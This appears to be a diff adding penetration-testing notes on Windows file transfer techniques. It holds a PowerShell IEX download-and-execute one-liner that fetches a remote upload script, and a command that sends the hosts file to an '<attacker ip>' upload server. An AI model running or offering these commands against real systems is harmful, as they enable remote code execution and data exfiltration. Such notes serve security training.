@@ -1,1 +1,29 @@
+---------------------------
+File Transfer - Base64 Encode & Decode
+---------------------------
+
+1. PS encode Base64 file
+
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+
+2. Verify file hash
+
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+
+---------------------------
+File Transfer - PS Uploads
+---------------------------
+
+1. Installing a Configured WebServer with Upload
+
+pip3 install uploadserver
+python3 -m uploadserver
+
+2. Upload PSUpload.ps1
+- https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
+
+3. Uplaod File to python upload server
+
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://<attacker ip>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 
